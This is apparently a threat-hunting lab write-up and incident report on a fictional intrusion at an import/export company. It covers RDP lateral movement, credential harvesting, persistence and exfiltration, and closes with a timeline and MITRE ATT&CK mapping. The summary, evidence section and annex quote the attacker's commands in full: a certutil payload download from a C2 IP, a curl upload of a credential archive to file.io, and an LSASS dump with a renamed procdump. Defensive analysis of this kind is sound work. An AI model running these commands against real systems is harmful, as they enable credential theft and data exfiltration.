![Screenshot_7-4-2026_94220_www skool com](https://github.com/user-attachments/assets/b2b03574-5555-4dd7-a013-d06fb0e80ab5)
"

# Threat-Hunt: Cargo Hold

# Index
- [Executive Summary](#executive-summary)
- [Technical Analysis](#technical-analysis)
- [Affected Systems & Data](#affected-systems--data)
- [Evidence Sources & Analysis](#evidence-sources--analysis)
- [Indicators of Compromise (IoCs)](#indicators-of-compromise-iocs)
- [Root Cause Analysis](#root-cause-analysis)
- [Technical Timeline](#technical-timeline)
- [Nature of the Attack](#nature-of-the-attack)
- [Impact Analysis](#impact-analysis)
- [Response and Recovery Analysis](#response-and-recovery-analysis)
- [Immediate Response Actions](#immediate-response-actions)
- [Eradication Measures](#eradication-measures)
- [Recovery Steps](#recovery-steps)
- [Post-Incident Actions](#post-incident-actions)
- [Annex A](#annex-a)
- [Technical Timeline](#technical-timeline-1)
- [MITRE ATT&CK Technique Mapping](#mitre-attck-technique-mapping--technical-timeline)

# Executive Summary
## Incident ID:
- INC2025-0011-019

## Incident Severity:
 (Critical)

## Incident Status:
- done

## Incident Overview:
- Following initial access on November 19th, the threat actor re-established presence approximately 72 hours later at 2025-11-22T00:27:58Z. Subsequent activity included lateral movement within the network and large-scale data transfers observed on the file server during off-hours.

Indicators of credential harvesting and data exfiltration were identified, along with evidence of persistence mechanisms and anti-forensic behavior, suggesting an effort to maintain long-term access while evading detection.

## Key Findings:
After compromising an endpoint, the threat actor executed lateral movement and identified the critical server azuki-fileserver01 via remote share enumeration. The actor conducted privilege and network enumeration to expand access.

A staging directory was created to prepare data for exfiltration, with attempts to obfuscate its path for defensive evasion. The actor then utilized Living-off-the-Land (LotL) techniques, leveraging native system utilities to download a malicious script into the staging location..<br>

The C2 IP address used to download the script `ex.ps1` was identified as `78.141.196.6` to the staging directory `C:\Windows\Logs\CBS\`. Credential file discovery was used for collection and created the file `IT-Admin-Passwords.csv` within the staging directory. The built-in system utility "xcopy.exe" was used in attempt to reduce the chance of detection of security alerts to stage data from the network share `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`. The compression tool "tar.exe", which is not native to legacy Windows environments, then was utilized to archive collected data using the command `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`. In order to avoid signature-base detection, the credential dumping tool was renamed to `pd.exe` and the process memory dump command `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp` performed the collection.<br>

Exfiltration steps were then initiated by `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io` which uses the cloud file sharing service file.io. Registry autorun keys were created for persistence with the registry value name `FileShareSync` which used the process `svchost.ps1` to masquerade the malicious files as legitimate Windows components to avoid suspicion. As an attempt at anti-forensics, the malicious actor then targeted the PowerShell command history `ConsoleHost_history.txt` for deletion.

## Immediate Actions:
- The SOC and DFIR teams exclusively managed the incident response procedures internally. Immediate action was taken to isolate the compromised systems from the network through the use of VLAN segmentation. To facilitate a comprehensive investigation, the SOC and DFIR teams gathered extensive data which included network traffic capture files. Additionally, all affected systems were plugged to a host security solution and all event logs were automatically collected by the existing SIEM.

## Stakeholder Impact:
### Customers:
- The credentials of IT accounts were exfiltrated and there is a potential that customer information may have been impacted as well. Impersonations of IT staff and the possibility of customer data being at risk are a possibility. Concerns with confidentiality of customer data is a priority and as a precautionary measure, some services were temporarily taken offline. The financial implications of this downtime are currently being assessed but could result in the loss of revenue and customer trust.

### Employees:
- The compromised device `azuki-fileserver01` housed sensitive employee information and has been identified as a major risk to employees. There has been a known remote accessed account `kenji.sato` that has been identified to have been compromised earlier and eventually led to this particular incident. The administrative account `fileadmin` has had indications of compromise and was utilized in this particular incident. The potential for identity theft, phishing attacks, and unauthorized access is critical.

### Business Partners:
- The fileserver affected by this incident has been known to hold information with business partners and company data. The unintended distribution of proprietary code or technology is concerning. There may be ramifications for business partners who rely on the integrity and exclusivity of Azuki Import/Export Trading CO., LTD.

### Regulatory Bodies:
- The breach of systems could have compliance implications. Regulatory bodies may impose fines or sanctions on Azuki Import/Export Trading CO., LTD for failing to adequately protect sensitive data. This ultimately falls on the jurisdiction and nature of the compromised data.

### Shareholders:
- This incident presents a potential short-term impact on the organization’s stock value, driven by diminished customer trust and the risk of regulatory penalties. The long-term financial and reputational impact will depend on the effectiveness of remediation efforts, including incident response, transparency, and the organization’s ability to restore stakeholder confidence.

# Technical Analysis
## Affected Systems & Data
Due to inadequate network access controls, the threat actor was able to establish initial access and maintain a period of dwell time before resuming activity. This delay allowed the actor to operate undetected and prepare for further actions within the environment.

The actor subsequently leveraged this access to expand their presence and continue operations across the network.

### Devices:
- `azuki-sl`
- `azuki-fileserver01`
### Accounts:
- `fileadmin`
- `kenji.sato`
  
## Evidence Sources & Analysis
After gaining initial access on November 19, 2025, the threat actor resumed activity approximately 72 hours later (2025-11-22T00:27:58Z), as identified through SOC monitoring. This activity included lateral movement within the network and large-volume data transfers occurring during off-hours on the file server, indicating potential data staging or exfiltration efforts.

<img width="1168" height="304" alt="white_background_image" src="https://github.com/user-attachments/assets/8e7457e1-8d4c-4090-a870-4f9cb7cfee48" />


The remote IP `159.26.106.98` made a successful logon to the device `azuki-sl` through the compromised account `kenji.sato` at `2025-11-22T00:27:58.4166424Z`. After this point, suspicious actions were taken and malicious intent were apparent.<br>

<img width="1968" height="498" alt="image" src="https://github.com/user-attachments/assets/aba5dd4d-bc3f-4ca3-970c-caa72ddf32fb" />


Lateral movement was identified across multiple systems, with activity originating from the process mstsc.exe, indicating the use of Remote Desktop Protocol (RDP) as a remote access mechanism. This behavior suggests the threat actor leveraged legitimate administrative tools to move laterally within the environment.

<<img width="1781" height="553" alt="image" src="https://github.com/user-attachments/assets/3b73ae58-d811-4768-80c7-fb911e39a704" />


Queries for any remote sessions with successful logon attempts discovered suspicious activity involving the critical fileserver `azuki-fileserver01`.

<img width="1816" height="488" alt="image" src="https://github.com/user-attachments/assets/459cbd87-5546-49f3-8246-2343a3fc81fb" />


Ongoing lateral movement led to the compromise of the administrative account fileadmin, which was subsequently used to facilitate privilege escalation and expanded enumeration activities. This indicates the threat actor successfully elevated access to a higher-privileged context to further their objectives within the environment.

<img width="1756" height="543" alt="image" src="https://github.com/user-attachments/assets/739e17a2-a76f-4ce5-8645-f932d3cdd5f3" />


At 2025-11-22T00:40:54Z, the threat actor initiated network enumeration using net.exe share to identify available shared resources. This activity was followed by remote share enumeration at 2025-11-22T00:42:01Z via net.exe view \\10.1.0.188, enabling the discovery of accessible file servers and data repositories within the environment.

This sequence of commands indicates systematic reconnaissance to map network resources and identify potential targets for further access and data collection

<img width="1587" height="432" alt="image" src="https://github.com/user-attachments/assets/62b22581-8aba-4e4c-adb9-ac3aa122e0b3" />


Privilege enumeration tactics continued with intent to determine what actions can be performed and whether privilege escalation is required.

<img width="1529" height="397" alt="image" src="https://github.com/user-attachments/assets/6ed4a98a-172f-4090-8e46-62d61b8a2bf5" />


The threat actor conducted network configuration enumeration to gain situational awareness of the environment, including identifying domain membership and mapping additional network segments. This activity suggests deliberate reconnaissance to support further lateral movement and target identification..

<img width="1558" height="397" alt="image" src="https://github.com/user-attachments/assets/cc162bc3-fef5-4223-8c4f-785f78772286" />


The threat actor modified file system attributes to conceal a staging directory, likely to evade detection by users and security tools. A directory at C:\Windows\Logs\CBS was established and utilized to organize malicious tools and staged data prior to exfiltration.

This directory has been confirmed as a critical Indicator of Compromise (IoC) and is directly associated with the observed malicious activity.

<img width="1877" height="538" alt="image" src="https://github.com/user-attachments/assets/0d56e891-a6b0-4e3d-b81e-2d5b8f26636a" />


Initial evidence of malicious command execution indicates the threat actor leveraged legitimate system utilities with network functionality to download a suspicious script. This behavior is consistent with Living-off-the-Land (LotL) techniques, allowing the actor to blend in with normal system activity and evade detection.

The threat actor utilized certutil.exe, a legitimate Windows utility, to download the PowerShell script ex.ps1 via the command certutil.exe -urlcache -f http://78.141.196.6:7331/ex.ps1. This action marks the initial outbound connection to the command-and-control (C2) infrastructure at 78.141.196.6, consistent with Living-off-the-Land (LotL) techniques used to evade detection.

Telemetry confirms that the PowerShell script ex.ps1 was retrieved from the external IP 78.141.196.6 and stored within the staging directory C:\Windows\Logs\CBS\. Upon execution, the script facilitated credential collection, data staging, and preparation for exfiltration.

The staged data was subsequently exfiltrated via a cloud service, suggesting the use of trusted platforms to evade detection and bypass traditional network security controls.

<img width="1409" height="524" alt="image" src="https://github.com/user-attachments/assets/ad753c60-9707-419c-9918-a0d7ed03b1af" />


A credential file, IT-Admin-Passwords.csv, was created within the staging directory, indicating the aggregation of sensitive authentication data. The file name strongly suggests targeted collection of administrative credentials, which could be leveraged for privilege escalation, persistence, or further lateral movement within the environment.

<img width="1977" height="517" alt="image" src="https://github.com/user-attachments/assets/e31e3af5-060b-4a64-8df8-20478fc14678" />
>

The threat actor leveraged native system utilities to stage data from a network share, employing Living-off-the-Land (LotL) techniques to reduce the likelihood of detection and bypass security controls. This approach enabled the actor to blend malicious activity with legitimate system operations.

<img width="1838" height="491" alt="image" src="https://github.com/user-attachments/assets/cde12441-a87a-4571-ae43-e039a1d0d4b4" />


The threat actor employed cross-platform compression utilities to archive and consolidate staged data, facilitating efficient collection and preparation for exfiltration. This activity indicates deliberate data packaging to support large-scale data transfer while minimizing detection.

<img width="1182" height="335" alt="image" src="https://github.com/user-attachments/assets/bb129fff-655c-46a7-ad7c-e45a5578bde2" />


The threat actor renamed the credential dumping tool to pd.exe to reduce its visibility and evade detection by security controls. This behavior reflects an attempt to disguise malicious tooling and blend in with legitimate system processes.

<img width="1542" height="392" alt="image" src="https://github.com/user-attachments/assets/8c2d6fe8-5941-47bf-875f-78f93f739dfa" />


Evidence of credential dumping was identified via process memory extraction targeting lsass.exe, a critical Windows security process responsible for handling authentication data. Analysis indicates that the renamed tool pd.exe executed the command pd.exe -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp to generate a memory dump containing credential material, which was then stored in the staging directory.

This behavior is consistent with established credential access techniques aimed at extracting sensitive authentication material, including plaintext credentials, password hashes, and Kerberos tickets. Such data can be leveraged to enable privilege escalation, sustain unauthorized access, and support further lateral movement across the environment.

<img width="1950" height="506" alt="image" src="https://github.com/user-attachments/assets/0e734a13-a9fa-4919-844d-4e231bd34bc0" />


Confirmed data exfiltration was performed using command-line HTTP clients, allowing the threat actor to conduct scripted and automated data transfers over standard web protocols. This technique supports stealthy exfiltration by blending with legitimate network traffic.

The associated command patterns should be incorporated into detection rules to enhance monitoring and response capabilities. Telemetry indicates multiple outbound transfers involving files with varying names, raising a high likelihood of sensitive stakeholder data being exfiltrated.

<img width="1973" height="472" alt="image" src="https://github.com/user-attachments/assets/8bbbef60-ee3f-4694-a5b4-3fae2e0a4d61" />


Persistence was established via modification of a registry autostart location through the creation of the value FileShareSync. The value name was intentionally crafted to appear legitimate, suggesting an attempt to blend malicious persistence mechanisms with normal system activity and evade detection by security controls.

<img width="1897" height="485" alt="image" src="https://github.com/user-attachments/assets/b0fbdaf2-1f30-4cd8-9d7c-d3108ab13457" />


Persistence mechanisms were identified in the form of an obfuscated PowerShell script, svchost.ps1, likely designed to blend in with legitimate system processes. The use of obfuscation indicates deliberate efforts to evade detection while maintaining continued access within the environment.

<img width="1897" height="485" alt="image" src="https://github.com/user-attachments/assets/0a5ba785-9945-4849-ad0f-34f601b84081" />




Evidence of anti-forensic behavior was observed with the deletion of the PowerShell history file ConsoleHost_history.txt, which normally retains command history across sessions. This action suggests a deliberate effort by the threat actor to remove traces of executed commands and impede investigative and forensic efforts.

## Indicators of Compromise (IoCs)
### C2 IP:
- 78.141.196.6
- ex.ps1 (SHA256):52749f37ff21af7fa72c2f6256df11740bb88b61eb5b6bf946d37a44a201435f

## Root Analysis
Weak network access controls facilitated unauthorized access into Azuki Import/Export Co., Ltd.’s internal environment, allowing the threat actor to establish an initial foothold within the network.

Root cause analysis attributes the incident to the event designated as “Port of Entry,” which resulted in the initial compromise of a privileged account. Approximately 72 hours later, the threat actor resumed activity, leveraging the compromised account to conduct lateral movement.

Contributing factors included deficiencies in identity and access management controls, inadequate network segmentation, and an overall weak security posture, all of which expanded the attack surface. The absence of advanced detection and mitigation strategies—such as Zero Trust principles and proactive threat hunting—further enabled the attack to progress.

# Technical Timeline
## Initial Compromise
On November 22, 2025, at 2025-11-22T00:27:58Z, the threat actor resumed activity after a period of dwell time, reconnecting from the external IP address 159.26.106.98. This behavior indicates controlled re-entry using previously compromised credentials or access mechanisms.

Following re-establishment of access, the actor initiated lateral movement within the environment, marking the progression from persistence to active exploitation.

## Lateral Movement
On November 19, 2025, at 2025-11-19T19:10:49Z, the threat actor conducted reconnaissance to identify high-value lateral movement targets based on data sensitivity and privilege levels. This activity resulted in the compromise of the critical file server azuki-fileserver01 and the administrative account fileadmin, significantly increasing the actor’s level of access within the environment.

## Data Access & Exfiltration
On November 22, 2025, at 2025-11-22T01:07:53Z, the threat actor leveraged native system commands to recursively copy and stage data from a network share, employing Living-off-the-Land (LotL) techniques to evade detection.

At 2025-11-22T01:30:10Z, the data was compressed using a cross-platform utility to facilitate efficient transfer. This was followed by exfiltration to a cloud-based file sharing service at 2025-11-22T01:59:54Z, indicating the use of trusted platforms to blend malicious activity with legitimate traffic.

At 2025-11-22T02:24:44Z, the actor initiated a memory dump process targeting credential extraction, further expanding access. Additional exfiltration activity was observed using native Windows utilities capable of performing outbound HTTP transfers with file payloads.

## C2 Communications
On November 22, 2025, at 2025-11-22T00:56:47Z, analysis identified outbound communication with the external IP address 78.141.196.6, confirmed as command-and-control (C2) infrastructure associated with the threat actor.

## Malware Deployment or Activity
November 22, 2025, `2025-11-22T00:56:47.4100711Z`: Legitimate system utilities with network capabilities were weaponized to download malware to evade detection. The malware script `ex.ps1` was downloaded into the staging directory by using a legitimate Windows binary.

## Containment Times
-On November 23, 2025, at 02:30:10, Azuki Import/Export Co., Ltd.’s SOC and DFIR teams identified and contained the incident by isolating compromised devices and accounts via VLAN segmentation.

At 02:50:56, a formal investigation was initiated to determine the full scope and impact of the compromise across affected systems.

At 07:30:56, firewall controls were updated to block the identified C2 IP address, successfully severing the threat actor’s remote access and further containing the incident.
## Eradication Times
-On November 23, 2025, at 07:45:23, malware remediation efforts were conducted using a specialized removal tool to scan and cleanse affected systems. This process resulted in the identification and removal of unauthorized Remote Access Tools (RATs) associated with the intrusion.

At 08:20:37, comprehensive credential reset procedures were executed for all affected accounts and any credentials potentially exposed during the incident, mitigating the risk of continued unauthorized access.

## Recovery Times
On November 23, 2025, at 09:14:48, after validating that affected systems were fully remediated and free of malicious artifacts, the SOC team initiated system restoration using verified clean backups, ensuring a secure return to normal operations

# Nature of the Attack
The threat actor demonstrated a structured modus operandi, leveraging a range of tactics, techniques, and procedures (TTPs) across the intrusion lifecycle to gain access, maintain persistence, and achieve their objectives within the environment.

- Defense Evasion
The threat actor employed multiple defense evasion techniques, including modification of file system attributes to conceal staging directories and the use of legitimate system utilities to execute malicious operations. The abuse of native Windows binaries (LOLbins) for payload retrieval demonstrates a high level of sophistication and an intent to evade detection by blending with legitimate system activity.

Operational Security (OpSec) and Persistence:
The actor applied basic OpSec measures by renaming credential dumping tools to avoid signature-based detection. Persistence was established through registry-based autostart mechanisms, ensuring execution upon system startup or user logon. Furthermore, the identification of a beaconing process masquerading as a legitimate Windows component underscores the actor’s use of deception to maintain long-term access while evading security controls.

# Impact Analysis
This section provides a deeper analysis of the stakeholder impact initially outlined at the beginning of this report. Considering the organization’s operational structure, business context, and regulatory obligations, it is essential to conduct a comprehensive evaluation of how the incident affected each stakeholder group

# Response and Recovery Analysis
# Immediate Response Actions
## Revocation of Access
### Identification of Compromised Accounts / Systems:
Using Microsoft Defender Advanced Hunting, anomalous and suspicious activities linked to the intrusion were identified, enabling the detection of compromised accounts and affected systems across the environment.:
### Devices:
- `azuki-sl`
- `azuki-fileserver01`
### Accounts:
- `fileadmin`
- `kenji.sato`

### Timeframe:
Unauthorized activity was initially detected at 2025-11-22T00:27:58Z. The threat actor’s access was fully terminated on November 23, 2025, at 07:30:56, after firewall controls were updated to block the associated C2 IP address, effectively severing external communication.

### Method of Revocation:
Alongside firewall rule enforcement, Active Directory policies were implemented to force logoff of sessions tied to potentially compromised accounts. Additionally, credential reset procedures were executed for all affected users to mitigate the risk of further unauthorized access.

### Impact:
Rapid revocation of access successfully disrupted ongoing lateral movement, reducing the risk of further system compromise and mitigating additional data exfiltration attempts.
## Containment Strategy
### Short-Term Containment:
As an immediate containment measure, VLAN segmentation was enforced to isolate compromised systems from the broader internal network. This action effectively disrupted the threat actor’s ability to continue lateral movement within the environment.

### Long-Term Containment:
The next phase of containment focuses on strengthening network segmentation by isolating critical systems and departmental resources into dedicated segments, complemented by stricter network access controls. This strategy ensures that access to internal resources is limited to authorized devices only, thereby reducing the attack surface and improving resilience against future threats.

### Effectiveness:
TImplemented containment measures successfully prevented the threat actor from escalating privileges and expanding laterally across the environment, thereby minimizing the overall impact of the incident.

# Eradication Measures
## Malware Removal:
- Identification: Anomalous processes were identified on compromised systems, with forensic analysis confirming the execution of malicious payloads. Persistence mechanisms were also observed through the deployment of a remote access tool (RAT).

Eradication: Targeted remediation was performed using a specialized malware removal solution, resulting in the successful elimination of all identified malicious components, including the RAT.

Validation: Post-eradication validation included secondary scanning and heuristic analysis to ensure complete removal of malware artifacts and to verify system integrity

## System Patching:
### Vulnerability Identification:
Deficiencies within the organization’s role-based access control (RBAC) framework were identified as a contributing factor to the initial compromise. The threat actor exploited the compromised account to conduct lateral movement across internal network shares, systematically targeting additional accounts to achieve privilege escalation and expand access within the environment.

### Patch Management:
Access control policies were promptly revised and enforced across all affected systems and accounts. In parallel, robust network segmentation was implemented across critical servers and internal network segments as a high-priority initiative to strengthen the organization’s security posture.

### Fallback Procedures:
Pre-patching procedures included creating system snapshots and backing up configurations to preserve system state. This approach ensures rapid rollback capability in the event that updates introduce instability or operational issues.

# Recovery Steps
## Data Restoration
### Backup Validation:
Before initiating data restoration, backup integrity was rigorously validated through checksum verification, ensuring the authenticity and reliability of the backup data prior to system recovery.

### Restoration Process:
The SOC team executed a controlled restoration of all affected systems using validated backups, ensuring system integrity and a secure return to operational status.

### Data Integrity Checks:
Following system restoration, SHA-256 cryptographic hashing was utilized to validate the integrity and authenticity of restored data, ensuring no tampering or corruption occurred during the recovery process.

## System Validation
### Security Measures:
Firewalls and intrusion detection systems were updated with current threat intelligence feeds, enabling real-time detection and alerting for indicators of compromise (IoCs) associated with this incident.

### Operational Checks:
Before restoring systems to the live production environment, comprehensive operational testing including load and stress testing was performed to ensure system stability, performance, and readiness for full operational use.

# Post-Incident Actions
## Monitoring
### Enhanced Monitoring Plans:
The organization’s monitoring strategy was updated to include behavioral analytics, allowing for the identification of anomalies and deviations from baseline activity indicative of potential threats. In parallel, asset inventory and management efforts were initiated to support the enforcement of robust network access controls and improve overall visibility across the environment.

### Tools and Technologies:
Microsoft Defender capabilities will be further leveraged to develop and deploy advanced correlation rules tailored to detect the tactics, techniques, and procedures (TTPs) observed in this breach, enhancing the organization’s ability to identify and respond to similar threats in the future.

## Lessons Learned
### Gap Analysis:
he incident exposed critical gaps in the organization’s security posture, specifically within network access controls, network segmentation, and user awareness of phishing-based threats involving malicious documents. Addressing these areas will be essential to reducing future risk and improving overall resilience.

### Recommendations for Improvement:
Priority has been placed on strengthening asset inventory management, enhancing threat monitoring capabilities, and advancing security awareness training programs to improve overall visibility, detection, and user resilience against potential threats.
### Future Strategy:
The organization will adopt a forward-looking security strategy centered on granular network access controls, advanced network segmentation, and the implementation of a Zero Trust architecture. Additionally, increased investment in security awareness training will further strengthen the organization’s defense against evolving threats.

# Annex A

# Technical Timeline
|              Time              |                                                              Activity                                                              |
|--------------------------------|------------------------------------------------------------------------------------------------------------------------------------|
| 2025-11-22T00:27:58Z
The threat actor re-established access following approximately 72 hours of dwell time. The returning connection originated from 159.26.106.98, a different IP than the initial compromise, indicating controlled re-entry using previously obtained access.
2025-11-19T19:10:49Z
Lateral movement was observed from the compromised system to the file server azuki-fileserver01, with mstsc.exe (RDP) activity correlating to successful remote logins.
2025-11-19T19:10:49Z
Unauthorized access to the administrative account fileadmin was detected, with an unknown logon type, indicating potential credential compromise.
2025-11-22T00:40:54Z
The command net.exe share was executed to enumerate local network shares, marking the beginning of internal discovery activity.
2025-11-22T00:42:01Z
Remote share enumeration was performed using net.exe view \\10.1.0.188, identifying accessible file servers and data repositories.
2025-11-22T00:42:24Z
Privilege enumeration was conducted using whoami.exe /all to identify user privileges and group memberships.
2025-11-22T00:42:46Z
Network configuration enumeration was executed via ipconfig.exe /all, providing insight into network structure and interfaces.
2025-11-22T00:55:43Z
A staging directory C:\Windows\Logs\CBS was created and concealed using attrib.exe +h +s, indicating preparation for data staging and exfiltration. This path is identified as a critical Indicator of Compromise (IoC).
2025-11-22T00:56:47Z
The command certutil.exe -urlcache -f http://78.141.196.6:7331/ex.ps1 was executed to download a malicious PowerShell script, establishing initial communication with the C2 server 78.141.196.6.
2025-11-22T01:07:53Z
A credential file IT-Admin-Passwords.csv was created within the staging directory, indicating targeted credential harvesting.
2025-11-22T01:07:53Z
Data staging was performed using xcopy.exe, recursively copying files from a network share into the staging directory while preserving attributes.
2025-11-22T01:30:10Z
Data was compressed using tar.exe, creating credentials.tar.gz to prepare for efficient exfiltration.
2025-11-22T01:59:54Z
Data exfiltration was conducted using curl.exe to upload the compressed archive to the cloud service file.io, leveraging trusted infrastructure to evade detection.
2025-11-22T02:03:19Z
The credential dumping tool was renamed to pd.exe, indicating basic operational security (OpSec) measures to evade detection.
2025-11-22T02:10:50Z
Persistence was established via the creation of a registry autostart entry named FileShareSync, designed to appear as legitimate software.
2025-11-22T02:10:50Z
An obfuscated PowerShell script svchost.ps1 was deployed as a persistence mechanism, masquerading as a legitimate system component.
2025-11-22T02:24:44Z
Credential dumping activity was confirmed through execution of pd.exe -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp, targeting LSASS to extract authentication data.
2025-11-22T02:26:01Z
Anti-forensic activity was observed with the deletion of ConsoleHost_history.txt, indicating an attempt to remove evidence of executed PowerShell commands. |

## MITRE ATT&CK Technique Mapping – Technical Timeline

| Time (UTC) | Activity Summary | Tactic | Technique ID | Technique Name | Justification |
|------------|-----------------|--------|--------------|----------------|---------------|
|| **Timestamp (UTC)** | **Activity**                                            | **Tactic**                               | **Technique ID** | **Technique Name**                                   | **Analysis**                                                                       |
| ------------------- | ------------------------------------------------------- | ---------------------------------------- | ---------------- | ---------------------------------------------------- | ---------------------------------------------------------------------------------- |
| 2025-11-22 00:27    | Return connection after ~72-hour dwell time from new IP | Command and Control                      | T1071.001        | Application Layer Protocol: Web Protocols            | Delayed callback behavior consistent with C2 beaconing over standard web protocols |
| 2025-11-19 19:10    | RDP lateral movement using `mstsc.exe`                  | Lateral Movement                         | T1021.001        | Remote Services: RDP                                 | Successful RDP authentication from compromised host to file server                 |
| 2025-11-19 19:10    | Unauthorized access to admin account `fileadmin`        | Privilege Escalation / Credential Access | T1078            | Valid Accounts                                       | Use of legitimate administrative credentials with anomalous logon characteristics  |
| 2025-11-22 00:40    | `net.exe share` enumeration                             | Discovery                                | T1135            | Network Share Discovery                              | Enumerated local SMB shares to identify accessible resources                       |
| 2025-11-22 00:42    | `net.exe view \\10.1.0.188`                             | Discovery                                | T1135            | Network Share Discovery                              | Enumerated remote shares to locate file servers and data repositories              |
| 2025-11-22 00:42    | `whoami.exe /all` privilege enumeration                 | Discovery                                | T1033            | System Owner/User Discovery                          | Enumerated user privileges and group memberships                                   |
| 2025-11-22 00:42    | `ipconfig.exe /all`                                     | Discovery                                | T1016            | System Network Configuration Discovery               | Identified network interfaces and configuration details                            |
| 2025-11-22 00:55    | `attrib.exe +h +s` used to hide directory               | Defense Evasion                          | T1564.001        | Hide Artifacts: Hidden Files and Directories         | Concealed staging directory to evade detection                                     |
| 2025-11-22 00:55    | Creation of staging directory `C:\Windows\Logs\CBS`     | Defense Evasion                          | T1074.001        | Data Staged: Local Data Staging                      | Organized collected data prior to exfiltration                                     |
| 2025-11-22 00:56    | `certutil.exe` downloads PowerShell payload             | Command and Control                      | T1105            | Ingress Tool Transfer                                | LOLBin used to retrieve malicious payload from external C2                         |
| 2025-11-22 01:07    | Creation of `IT-Admin-Passwords.csv`                    | Credential Access                        | T1555            | Credentials from Password Stores                     | Indicates targeted collection of administrative credentials                        |
| 2025-11-22 01:07    | `xcopy.exe` replicates file share contents              | Collection                               | T1039            | Data from Network Shared Drive                       | Collected sensitive data from network share                                        |
| 2025-11-22 01:30    | `tar.exe` compresses credentials                        | Collection                               | T1560.001        | Archive Collected Data: Archive via Utility          | Packaged data for efficient exfiltration                                           |
| 2025-11-22 02:03    | Credential dumping tool renamed to `pd.exe`             | Defense Evasion                          | T1036.005        | Masquerading: Match Legitimate Name                  | Renamed tool to evade signature-based detection                                    |
| 2025-11-22 02:24    | LSASS memory dump (`lsass.dmp`)                         | Credential Access                        | T1003.001        | OS Credential Dumping: LSASS Memory                  | Extracted credential material from LSASS process                                   |
| 2025-11-22 01:59    | `curl.exe` uploads archive to file.io                   | Exfiltration                             | T1567.002        | Exfiltration Over Web Services                       | Used HTTP client to transfer data externally                                       |
| 2025-11-22 01:59    | Use of cloud service `file.io`                          | Exfiltration                             | T1567            | Exfiltration Over Web Services                       | Leveraged legitimate cloud platform to evade detection                             |
| 2025-11-22 02:10    | Registry autorun value `FileShareSync` added            | Persistence                              | T1547.001        | Boot or Logon Autostart Execution: Registry Run Keys | Established persistence via registry modification                                  |
| 2025-11-22 02:10    | `svchost.ps1` masquerading                              | Defense Evasion                          | T1036.003        | Masquerading: Rename System Utilities                | Script disguised as legitimate Windows component                                   |
| 2025-11-22 02:26    | PowerShell history file deleted                         | Defense Evasion                          | T1070.003        | Indicator Removal on Host: Clear Command History     | Removed evidence to hinder forensic investigation                                  |

